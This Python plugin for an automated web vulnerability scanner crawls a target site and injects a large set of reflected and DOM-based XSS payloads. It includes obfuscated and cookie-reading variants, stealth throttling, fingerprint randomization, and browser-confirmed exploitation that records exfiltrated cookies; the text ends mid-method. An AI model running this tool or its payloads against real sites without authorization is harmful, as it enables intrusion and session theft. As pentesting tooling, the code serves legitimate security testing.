"""
Advanced XSS (Cross-Site Scripting) Exploit Plugin

This plugin provides professional-grade XSS exploitation capabilities including:
- Smart crawling to discover forms and links up to configurable depth
- Network throttling for stealth operations
- Session management with cookies, headers, and proxy support
- Selenium-powered DOM simulation with autofilling, submission, and click events
- Browser fingerprint randomization for stealth
- Evidence collection: screenshots, DOM context, console logs, HTML samples
- JavaScript injection context analysis: inline JS, event handlers, object properties, response headers
- JSON and HTML report output for automation/SaaS workflows
- Configurable scan parameters
- **Callback-based verification for reduced false positives and proof of exploitation**
- Highly extensible for future features

Callback Verification:
This plugin now supports callback-based XSS verification to reduce false positives.
Instead of relying solely on alert() dialogs or console errors, payloads make HTTP
callbacks to a configurable endpoint (Burp Collaborator, Interactsh, or internal server).
Only XSS findings with confirmed callbacks are marked as SUCCESS/VERIFIED.

This plugin is designed for professional security teams, SaaS platforms, and red-team scenarios.
"""

import sys
import os
import time
import random
import json
import base64
import hashlib
import logging
import re
from typing import Dict, List, Any, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_generator import get_payload_generator
from scanner.plugins.xss_callback_verifier import XSSCallbackVerifier, get_default_callback_payloads
from scanner.xss_gif_capture import get_xss_gif_capture
from scanner.plugins.advanced_browser_exploit import get_advanced_browser_exploit
from scanner.plugins.payload_mutator import PayloadMutator

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    logging.warning("BeautifulSoup4 not available. Some features will be limited.")

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available. HTTP features will be limited.")

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.common.exceptions import TimeoutException, WebDriverException
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False
    logging.warning("Selenium not available. DOM-based XSS testing will be limited.")

try:
    from fake_useragent import UserAgent
    HAS_FAKE_UA = True
except ImportError:
    HAS_FAKE_UA = False
    logging.warning("fake-useragent not available. Using static user agents.")

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    logging.warning("PIL/Pillow not available. Screenshot processing will be limited.")

logger = logging.getLogger(__name__)


class XSSPlugin(ExploitPlugin):
    """
    Advanced XSS Exploit Plugin
    
    This plugin provides comprehensive XSS testing and exploitation capabilities
    with professional-grade features for security teams and automated scanning platforms.
    
    Key Features:
    - Smart crawling with configurable depth
    - Network throttling for stealth
    - Session management (cookies, headers, proxy)
    - Selenium-powered DOM simulation
    - Browser fingerprint randomization
    - Evidence collection (screenshots, DOM, logs, HTML)
    - JavaScript injection context analysis
    - JSON and HTML report output
    """
    
    # Static user agents for fallback
    STATIC_USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    ]
    
    # XSS payload variants for different contexts
    XSS_PAYLOADS = {
        'basic': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
        ],
        'attribute': [
            '" onmouseover="alert(1)',
            '\' onmouseover=\'alert(1)',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
        ],
        'javascript': [
            '\'-alert(1)-\'',
            '"-alert(1)-"',
            '</script><script>alert(1)</script>',
            '});alert(1);//',
        ],
        'dom': [
            '#"><script>alert(1)</script>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
        ],
        'advanced': [
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
        ],
    }
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'xss'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'Advanced XSS Exploit Plugin'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Professional-grade XSS exploit plugin supporting reflected, stored, and DOM-based XSS '
            'with smart crawling, DOM simulation, session management, evidence collection, '
            'and comprehensive reporting for security teams and automated platforms.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '1.0.0'
    
    def __init__(self):
        """Initialize the XSS plugin."""
        super().__init__()
        self.visited_urls: Set[str] = set()
        self.discovered_forms: List[Dict] = []
        self.discovered_links: List[str] = []
        self.evidence: List[Dict] = []
        self.session = None
        self.driver = None
        self.callback_verifier: Optional[XSSCallbackVerifier] = None
        
        # Initialize GIF capture (optional feature)
        try:
            self.gif_capture = get_xss_gif_capture()
            if self.gif_capture:
                logger.info("XSS GIF capture initialized")
            else:
                logger.info("XSS GIF capture not available (missing dependencies)")
        except Exception as e:
            logger.warning(f"Failed to initialize GIF capture: {e}")
            self.gif_capture = None
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate XSS payloads based on context.
        
        Args:
            context: Optional context containing:
                    - payload_type: Type of payload ('basic', 'attribute', 'javascript', 'dom', 'advanced', 'all')
                    - custom_payloads: List of custom payloads to include
                    - encoding: Encoding to apply ('url', 'html', 'base64', 'unicode')
        
        Returns:
            List of XSS payload strings
        """
        context = context or {}
        payload_gen = get_payload_generator()
        
        payload_type = context.get('payload_type', 'all')
        custom_payloads = context.get('custom_payloads', [])
        encoding = context.get('encoding', None)
        
        payloads = []
        
        # Get base XSS payloads from generator
        base_payloads = payload_gen.get_payloads('xss', context)
        payloads.extend(base_payloads)
        
        # Add context-specific payloads
        if payload_type == 'all':
            for category_payloads in self.XSS_PAYLOADS.values():
                payloads.extend(category_payloads)
        elif payload_type in self.XSS_PAYLOADS:
            payloads.extend(self.XSS_PAYLOADS[payload_type])
        
        # Add custom payloads
        payloads.extend(custom_payloads)
        
        # Remove duplicates
        payloads = list(dict.fromkeys(payloads))
        
        # Apply encoding if specified
        if encoding:
            encoded_payloads = []
            for payload in payloads:
                try:
                    encoded = payload_gen.encode_payload(payload, encoding)
                    encoded_payloads.append(encoded)
                except Exception as e:
                    logger.warning(f"Failed to encode payload: {e}")
                    encoded_payloads.append(payload)
            payloads = encoded_payloads
        
        # Extra comprehensive XSS base payloads
        _EXTRA_XSS = [
            '<script>alert(1)</script>', '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
            '<body onload=alert(1)>', '<iframe onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>', '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>', '<details ontoggle=alert(1) open>',
            '"><script>alert(1)</script>', "';alert(1);//",
            '"><img src=x onerror=alert(1)>', "' onerror='alert(1)'",
            '<ScRiPt>alert(1)</ScRiPt>', '<SCRIPT>alert(1)</SCRIPT>',
            '</textarea><script>alert(1)</script>', '</title><script>alert(1)</script>',
            '&lt;script&gt;alert(1)&lt;/script&gt;', '%3Cscript%3Ealert(1)%3C/script%3E',
            'javascript:alert(1)', 'javascript:alert(document.cookie)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            '<svg><script>alert(1)</script></svg>',
            '<math><mtext></table></math><img src=x onerror=alert(1)>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
            '<div style="x:expression(alert(1))">',
            '\x3cscript\x3ealert(1)\x3c/script\x3e',
            '\u003cscript\u003ealert(1)\u003c/script\u003e',
            '<img src="x" onerror="alert(1)">',
            '<svg/onload=alert(1)>', '<svg\nonload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<a href="javascript:alert(1)">click</a>',
            '<form><button formaction="javascript:alert(1)">X</button>',
            '" autofocus onfocus=alert(1) x="',
            "' autofocus onfocus=alert(1) x='",
            'onmouseover=alert(1)', 'onclick=alert(1)',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<marquee onstart=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '<style>*{x:expression(alert(1))}</style>',
            '<!--<img src="--><img src=x onerror=alert(1)//">',
            '<![CDATA[><script>alert(1)</script>]]>',
            '<script charset="UTF-8">alert(1)</script>',
            '<script language="javascript">alert(1)</script>',
            '<body/onload=alert(1)>', '<body onpageshow=alert(1)>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            'vbscript:alert(1)', 'livescript:alert(1)',
            '<table background="javascript:alert(1)">',
            '<isindex action="javascript:alert(1)" type=image>',
            '<bgsound src="javascript:alert(1)">',
            '<script>window["alert"](1)</script>',
            '<script>top["alert"](1)</script>',
            '<script>(window["alert"])(1)</script>',
            '<div id="x"></div><script>document.getElementById("x").innerHTML="<img src=x onerror=alert(1)>"</script>',
            '<img src=x:alert(alt) onerror=eval(src) alt=1>',
            '<link rel=stylesheet href="javascript:alert(1)">',
            '<base href="javascript:alert(1)//">',
            '<input type="image" src="javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        ]
        payloads.extend(_EXTRA_XSS)
        # Generate dynamic XSS payloads across multiple event handlers and tags
        _DYNAMIC_XSS = []
        events = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur',
                  'onchange', 'onsubmit', 'onkeydown', 'onkeyup', 'onkeypress',
                  'onmousedown', 'onmouseup', 'onmousemove', 'onmouseout',
                  'onmouseenter', 'onmouseleave', 'ondblclick', 'oncontextmenu',
                  'onwheel', 'ondragstart', 'ondrop', 'oncopy', 'oncut', 'onpaste',
                  'onscroll', 'onresize', 'onselect', 'oninput', 'oninvalid',
                  'ontoggle', 'onplay', 'onpause', 'onended', 'oncanplay',
                  'onpageshow', 'onpagehide', 'onhashchange', 'onpopstate']
        for evt in events:
            _DYNAMIC_XSS.append(f'<svg {evt}=alert(1)>')
            _DYNAMIC_XSS.append(f'<img src=x {evt}=alert(1)>')
            _DYNAMIC_XSS.append(f'" {evt}="alert(1)"')
            _DYNAMIC_XSS.append(f"' {evt}='alert(1)'")
        tags = ['script', 'img', 'svg', 'body', 'input', 'video', 'audio', 'iframe',
                'object', 'embed', 'details', 'select', 'textarea', 'button', 'form',
                'table', 'td', 'th', 'style', 'link', 'meta', 'frame', 'frameset']
        for tag in tags:
            _DYNAMIC_XSS.append(f'<{tag}><script>alert(1)</script>')
            _DYNAMIC_XSS.append(f'</{tag}><script>alert(1)</script>')
        payloads.extend(_DYNAMIC_XSS)
        return PayloadMutator.scale_payloads_to_minimum(payloads)
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute XSS attack against the target.
        
        Args:
            target_url: Target URL to attack
            vulnerability_data: Dictionary containing:
                              - parameter: Vulnerable parameter name (optional)
                              - method: HTTP method (GET, POST) (optional)
                              - params: GET parameters dict (optional)
                              - data: POST data dict (optional)
                              - cookies: Cookies dict (optional)
                              - headers: Headers dict (optional)
            config: Optional configuration:
                   - crawl_depth: Maximum crawl depth (default: 2)
                   - max_pages: Maximum pages to crawl (default: 50)
                   - enable_dom_testing: Enable Selenium DOM testing (default: True)
                   - enable_crawler: Enable smart crawler (default: True)
                   - network_throttle: Network throttle delay in seconds (default: 0.5)
                   - timeout: Request timeout (default: 30)
                   - verify_ssl: Verify SSL certificates (default: False)
                   - proxy: Proxy configuration dict (optional)
                   - custom_headers: Custom HTTP headers (optional)
                   - custom_cookies: Custom cookies (optional)
                   - browser_type: Browser type for Selenium ('chrome', 'firefox') (default: 'chrome')
                   - headless: Run browser in headless mode (default: True)
                   - randomize_fingerprint: Randomize browser fingerprint (default: True)
                   - collect_evidence: Collect screenshots and DOM evidence (default: True)
                   - output_format: Output format ('json', 'html', 'both') (default: 'json')
                   - output_dir: Output directory for reports (default: './xss_reports')
                   - callback_verification_enabled: Enable callback-based verification (default: from settings)
                   - callback_endpoint: Callback endpoint URL (default: from settings)
                   - callback_timeout: Callback verification timeout in seconds (default: 30)
                   - use_internal_collaborator: Use internal Megido collaborator (default: True)
        
        Returns:
            Dictionary containing:
            - success: Boolean indicating if vulnerability was found
            - findings: List of vulnerability findings
            - data: Any extracted data
            - evidence: Evidence of exploitation
            - error: Error message if attack failed
            - report_path: Path to generated report (if applicable)
        """
        config = config or {}
        
        # Initialize result structure
        result = {
            'success': False,
            'findings': [],
            'data': {},
            'evidence': '',
            'error': None,
            'report_path': None,
        }
        
        # Reset state
        self.visited_urls.clear()
        self.discovered_forms.clear()
        self.discovered_links.clear()
        self.evidence.clear()
        
        try:
            # Extract configuration
            crawl_depth = config.get('crawl_depth', 2)
            max_pages = config.get('max_pages', 50)
            enable_dom_testing = config.get('enable_dom_testing', True)
            enable_crawler = config.get('enable_crawler', True)
            network_throttle = config.get('network_throttle', 0.5)
            timeout = config.get('timeout', 30)
            verify_ssl = config.get('verify_ssl', False)
            proxy = config.get('proxy', None)
            custom_headers = config.get('custom_headers', {})
            custom_cookies = config.get('custom_cookies', {})
            browser_type = config.get('browser_type', 'chrome')
            headless = config.get('headless', True)
            randomize_fingerprint = config.get('randomize_fingerprint', True)
            collect_evidence = config.get('collect_evidence', True)
            output_format = config.get('output_format', 'json')
            output_dir = config.get('output_dir', './xss_reports')
            
            # Callback verification configuration
            callback_verification_enabled = config.get('callback_verification_enabled', None)
            callback_endpoint = config.get('callback_endpoint', None)
            callback_timeout = config.get('callback_timeout', 30)
            use_internal_collaborator = config.get('use_internal_collaborator', True)
            
            # Load from Django settings if not provided in config
            if callback_verification_enabled is None:
                try:
                    from django.conf import settings
                    callback_verification_enabled = getattr(settings, 'XSS_CALLBACK_VERIFICATION_ENABLED', True)
                    if callback_endpoint is None:
                        callback_endpoint = getattr(settings, 'XSS_CALLBACK_ENDPOINT', '')
                    callback_timeout = getattr(settings, 'XSS_CALLBACK_TIMEOUT', callback_timeout)
                    use_internal_collaborator = getattr(settings, 'XSS_USE_INTERNAL_COLLABORATOR', use_internal_collaborator)
                except Exception:
                    callback_verification_enabled = True
            
            # Initialize callback verifier if enabled
            if callback_verification_enabled and (callback_endpoint or use_internal_collaborator):
                try:
                    self.callback_verifier = XSSCallbackVerifier(
                        callback_endpoint=callback_endpoint,
                        timeout=callback_timeout,
                        use_internal_collaborator=use_internal_collaborator
                    )
                    logger.info(f"Callback verification enabled: {self.callback_verifier.callback_endpoint}")
                except Exception as e:
                    logger.warning(f"Could not initialize callback verifier: {e}")
                    self.callback_verifier = None
            else:
                self.callback_verifier = None
                logger.info("Callback verification disabled, using traditional alert-based detection")
            
            # Setup session
            self._setup_session(timeout, verify_ssl, proxy, custom_headers, custom_cookies)
            
            # Phase 1: Smart Crawling (if enabled)
            # WARNING: Long-running blocking operation
            # This smart crawl and subsequent exploit phases can take significant time (minutes),
            # especially when crawling external sites or performing DOM-based testing with Selenium.
            # In production environments with Gunicorn/uWSGI web servers, ensure worker timeout is
            # set to at least 300 seconds (see gunicorn.conf.py) to prevent premature worker termination.
            # For scalable production deployments, consider moving heavy exploit tasks to background
            # workers using Celery, RQ, or similar async task queues.
            if enable_crawler and HAS_BS4 and HAS_REQUESTS:
                logger.info(f"Starting smart crawling from {target_url}")
                self._smart_crawl(target_url, crawl_depth, max_pages, network_throttle)
                logger.info(f"Crawling complete. Found {len(self.discovered_forms)} forms and {len(self.discovered_links)} links")
            
            # Phase 2: Test target URL directly
            logger.info(f"Testing target URL: {target_url}")
            findings = self._test_url_for_xss(
                target_url,
                vulnerability_data,
                enable_dom_testing,
                browser_type,
                headless,
                randomize_fingerprint,
                collect_evidence,
                network_throttle
            )
            result['findings'].extend(findings)
            
            # Phase 3: Test discovered forms
            if enable_crawler and self.discovered_forms:
                logger.info(f"Testing {len(self.discovered_forms)} discovered forms")
                for form in self.discovered_forms[:20]:  # Limit to first 20 forms
                    form_findings = self._test_form_for_xss(
                        form,
                        enable_dom_testing,
                        browser_type,
                        headless,
                        randomize_fingerprint,
                        collect_evidence,
                        network_throttle
                    )
                    result['findings'].extend(form_findings)
            
            # Determine if attack was successful
            if result['findings']:
                result['success'] = True
                result['evidence'] = f"Found {len(result['findings'])} XSS vulnerabilities"
                
                # Collect evidence summary
                result['data'] = {
                    'total_vulnerabilities': len(result['findings']),
                    'vulnerable_parameters': list(set(f.get('parameter', 'unknown') for f in result['findings'])),
                    'injection_contexts': list(set(f.get('context', 'unknown') for f in result['findings'])),
                    'urls_tested': len(self.visited_urls),
                    'forms_tested': len(self.discovered_forms),
                }
            
            # Phase 4: Generate reports
            if result['findings']:
                report_path = self._generate_report(
                    target_url,
                    result['findings'],
                    output_format,
                    output_dir
                )
                result['report_path'] = report_path
            
            # Phase 5: Unified Proof Reporting (if enabled)
            if config.get('enable_proof_reporting', True):
                try:
                    self._generate_proof_report(result, target_url, vulnerability_data, config)
                except Exception as e:
                    logger.warning(f"Proof reporting failed: {e}")
        
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"XSS attack failed: {e}", exc_info=True)
        finally:
            # Cleanup
            self._cleanup()
        
        return result
    
    def _setup_session(self, timeout: int, verify_ssl: bool, proxy: Optional[Dict],
                       custom_headers: Dict, custom_cookies: Dict) -> None:
        """Setup HTTP session with configuration."""
        if not HAS_REQUESTS:
            return
        
        self.session = requests.Session()
        
        # Configure retries
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Set timeout
        self.session.timeout = timeout
        
        # Set SSL verification
        self.session.verify = verify_ssl
        
        # Set proxy
        if proxy:
            self.session.proxies = proxy
        
        # Set custom headers
        if custom_headers:
            self.session.headers.update(custom_headers)
        
        # Set user agent
        user_agent = self._get_random_user_agent()
        self.session.headers['User-Agent'] = user_agent
        
        # Set cookies
        if custom_cookies:
            for key, value in custom_cookies.items():
                self.session.cookies.set(key, value)
    
    def _get_random_user_agent(self) -> str:
        """Get a random user agent string."""
        if HAS_FAKE_UA:
            try:
                ua = UserAgent()
                return ua.random
            except Exception:
                pass
        
        return random.choice(self.STATIC_USER_AGENTS)
    
    def _smart_crawl(self, start_url: str, max_depth: int, max_pages: int,
                     network_throttle: float) -> None:
        """
        Smart crawl to discover forms and links.
        
        Args:
            start_url: Starting URL for crawling
            max_depth: Maximum crawl depth
            max_pages: Maximum pages to crawl
            network_throttle: Delay between requests
        """
        if not HAS_BS4 or not HAS_REQUESTS or not self.session:
            logger.warning("Crawling requires BeautifulSoup4 and requests")
            return
        
        to_visit = [(start_url, 0)]  # (url, depth)
        
        while to_visit and len(self.visited_urls) < max_pages:
            url, depth = to_visit.pop(0)
            
            if url in self.visited_urls or depth > max_depth:
                continue
            
            try:
                # Network throttling
                if network_throttle > 0:
                    time.sleep(network_throttle)
                
                # Fetch page
                response = self.session.get(url, timeout=self.session.timeout)
                self.visited_urls.add(url)
                
                # Parse HTML
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Discover forms
                forms = soup.find_all('form')
                for form in forms:
                    form_data = self._parse_form(form, url)
                    if form_data and form_data not in self.discovered_forms:
                        self.discovered_forms.append(form_data)
                
                # Discover links
                if depth < max_depth:
                    links = soup.find_all('a', href=True)
                    for link in links:
                        href = link['href']
                        absolute_url = urljoin(url, href)
                        
                        # Only follow links in same domain
                        if self._is_same_domain(start_url, absolute_url):
                            if absolute_url not in self.visited_urls:
                                self.discovered_links.append(absolute_url)
                                to_visit.append((absolute_url, depth + 1))
                
                logger.debug(f"Crawled: {url} (depth: {depth})")
            
            except Exception as e:
                logger.warning(f"Error crawling {url}: {e}")
                continue
    
    def _parse_form(self, form_element, page_url: str) -> Optional[Dict]:
        """Parse a form element and extract its details."""
        try:
            action = form_element.get('action', '')
            method = form_element.get('method', 'GET').upper()
            
            # Resolve action URL
            if not action:
                action = page_url
            else:
                action = urljoin(page_url, action)
            
            # Extract form inputs
            inputs = []
            for input_elem in form_element.find_all(['input', 'textarea', 'select']):
                input_type = input_elem.get('type', 'text')
                input_name = input_elem.get('name', '')
                input_value = input_elem.get('value', '')
                
                if input_name:
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'value': input_value,
                    })
            
            if not inputs:
                return None
            
            return {
                'action': action,
                'method': method,
                'inputs': inputs,
                'page_url': page_url,
            }
        
        except Exception as e:
            logger.warning(f"Error parsing form: {e}")
            return None
    
    def _is_same_domain(self, url1: str, url2: str) -> bool:
        """Check if two URLs are from the same domain."""
        try:
            domain1 = urlparse(url1).netloc
            domain2 = urlparse(url2).netloc
            return domain1 == domain2
        except Exception:
            return False
    
    def _test_url_for_xss(self, url: str, vulnerability_data: Dict[str, Any],
                          enable_dom_testing: bool, browser_type: str, headless: bool,
                          randomize_fingerprint: bool, collect_evidence: bool,
                          network_throttle: float) -> List[Dict]:
        """
        Test a URL for XSS vulnerabilities.
        
        Returns:
            List of findings
        """
        findings = []
        
        # Get payloads
        payloads = self.generate_payloads({'payload_type': 'all'})
        
        # Extract parameters
        parameter = vulnerability_data.get('parameter')
        method = vulnerability_data.get('method', 'GET').upper()
        params = vulnerability_data.get('params', {})
        data = vulnerability_data.get('data', {})
        
        # Test each payload
        for payload in payloads[:30]:  # Limit to first 30 payloads
            if network_throttle > 0:
                time.sleep(network_throttle)
            
            # Reflected XSS testing
            reflected_finding = self._test_reflected_xss(
                url, parameter, method, params, data, payload
            )
            if reflected_finding:
                findings.append(reflected_finding)
            
            # DOM-based XSS testing with Selenium (if enabled)
            if enable_dom_testing and HAS_SELENIUM:
                dom_finding = self._test_dom_xss(
                    url, parameter, method, params, data, payload,
                    browser_type, headless, randomize_fingerprint, collect_evidence
                )
                if dom_finding:
                    findings.append(dom_finding)
        
        # NEW: Advanced browser-based exploitation for confirmed vulnerabilities
        # This provides real JavaScript execution confirmation in a browser
        if findings and enable_dom_testing:
            try:
                browser_exploit_findings = self._confirm_with_browser_exploit(
                    url, parameter, method, params, data, headless
                )
                findings.extend(browser_exploit_findings)
            except Exception as e:
                logger.warning(f"Browser exploitation confirmation failed: {e}")
        
        return findings
    
    def _capture_gif_proof(self, finding: Dict) -> None:
        """
        Capture GIF proof for a verified XSS finding.
        
        This method attempts to capture visual proof of the XSS exploitation
        and adds the GIF path to the finding dict.
        
        Args:
            finding: Finding dictionary to update with gif_proof field
        """
        if not self.gif_capture:
            logger.debug("GIF capture not available, skipping")
            return
        
        # Only capture GIF for verified findings
        if not finding.get('verified', False):
            logger.debug("Finding not verified, skipping GIF capture")
            return
        
        try:
            url = finding.get('url', '')
            payload = finding.get('payload', '')
            
            if not url or not payload:
                logger.warning("Missing URL or payload for GIF capture")
                return
            
            logger.info(f"Capturing GIF proof for XSS at {url}")
            
            # Capture GIF (with timeout/resource limits built-in)
            gif_path = self.gif_capture.capture_xss_proof(url, payload, duration=3.0)
            
            if gif_path:
                finding['proof_gif'] = gif_path
                logger.info(f"✓ GIF proof captured: {gif_path}")
            else:
                logger.warning("Failed to capture GIF proof")
                
        except Exception as e:
            # Don't let GIF capture errors interrupt the main scanning flow
            logger.error(f"Error capturing GIF proof: {e}", exc_info=True)
    
    def _test_reflected_xss(self, url: str, parameter: Optional[str], method: str,
                            params: Dict, data: Dict, payload: str) -> Optional[Dict]:
        """Test for reflected XSS."""
        if not HAS_REQUESTS or not self.session:
            return None
        
        try:
            # Inject payload
            test_params = params.copy()
            test_data = data.copy()
            
            if parameter:
                if method == 'GET':
                    test_params[parameter] = payload
                else:
                    test_data[parameter] = payload
            else:
                # Test all parameters
                for key in test_params.keys():
                    test_params[key] = payload
                for key in test_data.keys():
                    test_data[key] = payload
            
            # Send request
            if method == 'GET':
                response = self.session.get(url, params=test_params, timeout=self.session.timeout)
            else:
                response = self.session.post(url, data=test_data, timeout=self.session.timeout)
            
            # Check if payload is reflected
            if payload in response.text:
                # Analyze injection context
                context = self._analyze_injection_context(response.text, payload)
                
                return {
                    'type': 'reflected',
                    'url': url,
                    'parameter': parameter or 'multiple',
                    'method': method,
                    'payload': payload,
                    'context': context,
                    'evidence': f"Payload reflected in response (context: {context})",
                    'severity': 'high',
                    'timestamp': datetime.now().isoformat(),
                }
        
        except Exception as e:
            logger.debug(f"Error testing reflected XSS: {e}")
        
        return None
    
    def _analyze_injection_context(self, html: str, payload: str) -> str:
        """
        Analyze the injection context in the HTML.
        
        Returns context type: 'html', 'attribute', 'javascript', 'css', 'url'
        """
        try:
            # Find payload position
            pos = html.find(payload)
            if pos == -1:
                return 'unknown'
            
            # Look around the payload
            start = max(0, pos - 100)
            end = min(len(html), pos + len(payload) + 100)
            context_snippet = html[start:end]
            
            # Detect context
            if '<script' in context_snippet.lower() and '</script>' in context_snippet.lower():
                return 'javascript'
            elif '<style' in context_snippet.lower() and '</style>' in context_snippet.lower():
                return 'css'
            elif re.search(r'href\s*=\s*["\']', context_snippet, re.I):
                return 'url'
            elif re.search(r'\w+\s*=\s*["\']', context_snippet):
                return 'attribute'
            else:
                return 'html'
        
        except Exception:
            return 'unknown'
    
    def _confirm_with_browser_exploit(
        self,
        url: str,
        parameter: Optional[str],
        method: str,
        params: Dict[str, str],
        data: Dict[str, str],
        headless: bool = True
    ) -> List[Dict]:
        """
        Confirm XSS exploitation using advanced browser automation.
        
        This method uses the AdvancedBrowserExploit module to actually execute
        JavaScript in a real browser context and confirm exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            method: HTTP method
            params: GET parameters
            data: POST data
            headless: Run browser in headless mode
            
        Returns:
            List of confirmed exploitation findings
        """
        findings = []
        
        try:
            # Get browser exploit instance
            browser_exploit = get_advanced_browser_exploit(
                use_playwright=True,
                headless=headless
            )
            
            with browser_exploit:
                logger.info(f"Attempting browser-based exploitation confirmation for {url}")
                
                # Try exploitation with parameter if specified
                result = browser_exploit.attempt_xss_exploitation(
                    url=url,
                    parameter=parameter,
                    method=method,
                    additional_params=params if method == 'GET' else data,
                    context_hint=None,  # Auto-detect
                    timeout=15
                )
                
                if result.get('exploited'):
                    finding = {
                        'type': 'browser_exploit_confirmed',
                        'url': url,
                        'parameter': parameter or 'auto-detected',
                        'method': method,
                        'payload': result.get('payload_used'),
                        'context': result.get('context'),
                        'evidence': result.get('evidence'),
                        'severity': 'critical',  # Confirmed exploits are critical
                        'timestamp': datetime.now().isoformat(),
                        'confirmed': True,
                        'execution_time': result.get('execution_time'),
                        'screenshot_before': result.get('screenshot_before'),
                        'screenshot_after': result.get('screenshot_after'),
                        'dom_changes': result.get('dom_changes', []),
                        'console_logs': result.get('console_logs', []),
                        'cookies_exfiltrated': result.get('cookies_exfiltrated', {}),
                    }
                    findings.append(finding)
                    logger.info(f"✓ Browser exploitation confirmed! Payload: {result.get('payload_used')}")
                else:
                    logger.debug("Browser exploitation did not confirm vulnerability")
                    
        except Exception as e:
            logger.error(f"Browser exploitation error: {e}")
        
        return findings
    
    def _test_dom_xss(self, url: str, parameter: Optional[str], method: str,
                     params: Dict, data: Dict, payload: str, browser_type: str,
                     headless: bool, randomize_fingerprint: bool,
                     collect_evidence: bool) -> Optional[Dict]:
        """
        Test for DOM-based XSS using Selenium.
        
        If callback verification is enabled, uses callback payloads and waits for
        verification. Otherwise, uses traditional alert-based detection.
        """
        if not HAS_SELENIUM:
            return None
        
        driver = None
        payload_id = None
        
        try:
            # Setup browser
            driver = self._setup_browser(browser_type, headless, randomize_fingerprint)
            
            # Determine if we're using callback verification
            use_callback = self.callback_verifier is not None
            
            if use_callback:
                # Generate callback payload
                try:
                    callback_payload, payload_id = self.callback_verifier.generate_callback_payload(
                        base_payload=payload,
                        context='dom'
                    )
                    actual_payload = callback_payload
                    logger.info(f"Using callback payload with ID: {payload_id}")
                except Exception as e:
                    logger.warning(f"Failed to generate callback payload, falling back to alert: {e}")
                    use_callback = False
                    actual_payload = payload
            else:
                actual_payload = payload
            
            # Build URL with payload
            test_url = url
            if parameter and method == 'GET':
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[parameter] = [actual_payload]
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
            
            # Navigate to URL
            driver.get(test_url)
            
            # Wait for page load and JavaScript execution
            time.sleep(2)
            
            # If using callback verification, wait for callback
            if use_callback and payload_id:
                logger.info(f"Waiting for callback verification (timeout: {self.callback_verifier.timeout}s)...")
